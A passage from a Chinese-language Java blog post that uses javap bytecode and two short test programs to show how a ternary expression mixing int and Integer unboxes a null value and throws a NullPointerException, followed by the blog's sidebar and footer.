com/xxx/store/vo/im/MySearchCodeVo.getRetryAfter:()Ljava/lang/Integer;</span><br><span class="line">     248: goto          252</span><br><span class="line">     251: aconst_null</span><br><span class="line">     252: invokevirtual #129                // Method com/xxx/service/im/MyTokenManager$MyTokenRenter.giveBackToken:(Ljava/lang/Integer;Ljava/lang/Long;Ljava/lang/Integer;)V</span><br><span class="line">     255: aload         9</span><br><span class="line">     257: athrow</span><br></pre></td></tr></table></figure>

<p>注意字节码中的这几行代码</p>
<p><img src="../static/MB19061201-1.png" alt="图片1"></p>
<p>发现<code>vo != null ? vo.getRateLimitRemain() : 1</code> 这个代码，会把<code>vo.getRateLimitRemain()</code>从Integer转成基础数据类型int，再转为Integer传给<code>giveBackToken</code>方法，而<code>vo != null ? vo.getRetryAfter() : null</code>这个代码，则不会转化为基础数据类型直接传给<code>giveBackToken</code>方法。说明了exp ? value1 : value2运算，value1和value2分别为基础数据类型和基础数据类型的包装类时，会统一转为基础数据类型。</p>
<h2 id="测试验证"><a href="#测试验证" class="headerlink" title="测试验证"></a>测试验证</h2><p>测试代码1：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">    Tt tt = new Tt();</span><br><span class="line">    tt.m = 6;</span><br><span class="line">    test(tt != null ? tt.m : 2, tt != null ? tt.n : 6);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static class Tt &#123;</span><br><span class="line">    Integer m;</span><br><span class="line">    Integer n;</span><br><span class="line">&#125;</span><br><span class="line">public static void test(Integer a, Integer b) &#123;</span><br><span class="line">    System.out.println(a + &quot;--&quot; + b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果为空指针异常</p>
<p>测试代码2</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">    Tt tt = new Tt();</span><br><span class="line">    tt.m = 6;</span><br><span class="line">    test(tt != null ? tt.m : Integer.valueOf(2), tt != null ? tt.n : Integer.valueOf(6));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static class Tt &#123;</span><br><span class="line">    Integer m;</span><br><span class="line">    Integer n;</span><br><span class="line">&#125;</span><br><span class="line">public static void test(Integer a, Integer b) &#123;</span><br><span class="line">    System.out.println(a + &quot;--&quot; + b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>正常输出结果：6–null</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://page.uetty.com/2019/06/12/javap-example/" data-id="ck5qhi073002lg0ukczko5nwf" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/">java</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/IDE/">IDE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MyBatis/">MyBatis</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RabbitMQ/">RabbitMQ</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/api/">api</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/css/">css</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dubbo/">dubbo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/log4j/">log4j</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/maven/">maven</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql/">mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/open-source/">open source</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/redis/">redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/spring/">spring</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vulnerability/">vulnerability</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/IDE/" style="font-size: 10px;">IDE</a> <a href="/tags/MyBatis/" style="font-size: 10px;">MyBatis</a> <a href="/tags/RabbitMQ/" style="font-size: 10px;">RabbitMQ</a> <a href="/tags/api/" style="font-size: 12px;">api</a> <a href="/tags/css/" style="font-size: 10px;">css</a> <a href="/tags/docker/" style="font-size: 10px;">docker</a> <a href="/tags/dubbo/" style="font-size: 10px;">dubbo</a> <a href="/tags/java/" style="font-size: 20px;">java</a> <a href="/tags/linux/" style="font-size: 18px;">linux</a> <a href="/tags/log4j/" style="font-size: 10px;">log4j</a> <a href="/tags/maven/" style="font-size: 10px;">maven</a> <a href="/tags/mysql/" style="font-size: 14px;">mysql</a> <a href="/tags/open-source/" style="font-size: 10px;">open source</a> <a href="/tags/redis/" style="font-size: 10px;">redis</a> <a href="/tags/spring/" style="font-size: 16px;">spring</a> <a href="/tags/vulnerability/" style="font-size: 10px;">vulnerability</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">2020-01</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">2019-12</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">2019-11</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">2019-08</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">2019-07</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">2019-06</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">2019-05</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">2019-04</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">2019-03</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">2019-02</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">2018-12</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">2018-11</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">2018-10</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">2018-09</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">2018-08</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">2018-06</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">2018-03</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">2018-02</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">2017-12</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">2017-09</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">2017-08</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">2017-07</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">2017-05</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">2017-03</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/01/08/gitlab-api/">Gitlab Api</a>
          </li>
        
          <li>
            <a href="/2019/12/11/source-bitcount/">JDK中Integer.bitCount解析</a>
          </li>
        
          <li>
            <a href="/2019/11/25/linux-cgroup-cpu/">Linux限制进程CPU上限</a>
          </li>
        
          <li>
            <a href="/2019/08/15/log4j/">log4j xml配置文件个人配置如何不污染GIT远程仓库</a>
          </li>
        
          <li>
            <a href="/2019/07/31/common-excel/">阿里Easy Excel自定义样式注解</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 Vince<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>